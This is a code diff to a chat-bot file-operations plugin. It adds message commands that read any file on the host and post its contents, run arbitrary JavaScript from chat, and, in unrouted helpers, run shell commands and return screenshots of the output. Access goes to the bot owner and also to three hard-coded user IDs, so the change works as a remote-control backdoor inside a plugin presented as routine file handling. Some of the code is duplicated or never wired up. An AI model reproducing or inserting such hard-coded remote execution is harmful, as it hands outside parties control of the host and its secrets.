@@ -1,11 +1,34 @@
 import fs from "node:fs";
 import archiver from "archiver";
 import md5 from "md5";
+import puppeteer from "../../../lib/puppeteer/puppeteer.js";
+import hljs from "@highlightjs/cdn-assets/highlight.min.js";
+import { AnsiUp } from "ansi_up";
+const ansi_up = new AnsiUp();
 
 let Running = false;
 let es;
 let sendToGroup = true;
 let sendToOwner = true;
+
+const htmlDir = `${process.cwd()}/plugins/hl-ly-plugin/resources/background/Code/`;
+const tplFile = `${htmlDir}Code.html`;
+
+let prompt = cmd => [`echo "[$USER@$HOSTNAME $PWD]$([ "$UID" = 0 ]&&echo "#"||echo "$") ";${cmd}`];
+let inspectCmd = (cmd, data) => data.replace("\n", `${cmd}\n`);
+let langCmd = "sh";
+
+if (process.platform == "win32") {
+  prompt = cmd => [`powershell -EncodedCommand ${Buffer.from(`$ProgressPreference="SilentlyContinue";[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;prompt;${cmd}`, "utf-16le").toString("base64")}`];
+  inspectCmd = (cmd, data) => data.replace(/\r\n/g, "\n").replace("\n", `${cmd}\n`);
+  hljs.registerLanguage("powershell", (await import("@highlightjs/cdn-assets/es/languages/powershell.min.js")).default);
+  langCmd = "powershell";
+} else if (process.env.SHELL?.endsWith("/bash")) {
+  prompt = cmd => [
+    `"$0" -ic 'echo "\${PS1@P}"';${cmd}`,
+    { shell: process.env.SHELL },
+  ];
+}
 
 export class File extends plugin {
   constructor() {
@@ -13,7 +36,7 @@ export class File extends plugin {
       name: "文件操作",
       dsc: "文件操作",
       event: "message",
-      priority: -Infinity,
+      priority: -114514,
       rule: [
         {
           reg: "^取文件",
@@ -34,6 +57,19 @@ export class File extends plugin {
         {
           reg: "^look一下",
           fnc: "List"
+        },
+        {
+          reg: "^hj.+",
+          fnc: "hjCommand"
+        },
+//以下指令借鉴的TRSS-Plugin的“远程命令”
+        {
+          reg: "^hp.+",
+          fnc: "hpCommand"
+        },
+        {
+          reg: "^hc.+",
+          fnc: "hcCommand"
         }
       ]
     });
@@ -163,5 +199,96 @@ export class File extends plugin {
     }
 
     await this.reply(fs.readdirSync(filePath).join("\n"), true);
+  }
+
+  async hjCommand(e) {
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
+
+    const msg = this.e.msg.replace("hj", "").trim();
+    logger.mark(`[File] 发送文件内容：${logger.blue(msg)}`);
+
+    if (!fs.existsSync(msg) || !fs.statSync(msg).isFile()) {
+      await this.reply("文件不存在", true);
+      return false;
+    }
+
+    const fileContent = fs.readFileSync(msg, "utf-8");
+    await this.reply(fileContent, true);
+  }
+
+  async hpCommand(e) {
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
+    const cmd = this.e.msg.replace("hp", "").trim();
+
+    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`);
+    const ret = await this.evalSync(cmd, data => Bot.String(data));
+    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`);
+
+    if (!ret.stdout && !ret.error)
+      return this.reply("命令执行完成，没有返回值", true);
+    if (ret.stdout)
+      await this.reply(ret.stdout, true);
+    if (ret.error)
+      await this.reply(`错误输出：\n${ret.error.stack}`, true);
+  }
+
+  async hpPic(e) {
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
+    const cmd = this.e.msg.replace("hp", "").trim();
+    const ret = await Bot.exec(...prompt(cmd));
+
+    if (!ret.stdout && !ret.stderr && !ret.error)
+      return this.reply("命令执行完成，没有返回值", true);
+
+    let Code = [];
+    if (ret.stdout)
+      Code.push(ret.stdout.trim());
+    if (ret.error)
+      Code.push(`远程命令错误：\n${Bot.Loging(ret.error)}`);
+    else if (ret.stderr)
+      Code.push(`标准错误输出：\n${ret.stderr.trim()}`);
+
+    Code = await ansi_up.ansi_to_html(Code.join("\n\n"));
+    Code = inspectCmd(hljs.highlight(cmd, { language: langCmd }).value, Code);
+    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code });
+    return this.reply(img, true);
+  }
+
+  async hcCommand(e) {
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
+    const cmd = this.e.msg.replace("hc", "").trim();
+
+    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`);
+    const ret = await this.evalSync(cmd, data => Bot.String(data));
+    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`);
+
+    if (!ret.stdout && !ret.error)
+      return this.reply("命令执行完成，没有返回值", true);
+    if (ret.stdout)
+      await this.reply(ret.stdout, true);
+    if (ret.error)
+      await this.reply(`错误输出：\n${ret.error.stack}`, true);
+  }
+
+  async hcPic(e) {
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
+    const cmd = this.e.msg.replace("hc", "").trim();
+
+    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`);
+    const ret = await this.evalSync(cmd, data => Bot.Loging(data));
+    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`);
+
+    if (!ret.stdout && !ret.error)
+      return this.reply("命令执行完成，没有返回值", true);
+
+    let Code = [];
+    if (ret.stdout)
+      Code.push(ret.stdout.trim());
+    if (ret.error)
+      Code.push(`错误输出：\n${Bot.Loging(ret.error)}`);
+
+    Code = await ansi_up.ansi_to_html(Code.join("\n\n"));
+    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code });
+    return this.reply(img, true);
   }
 }
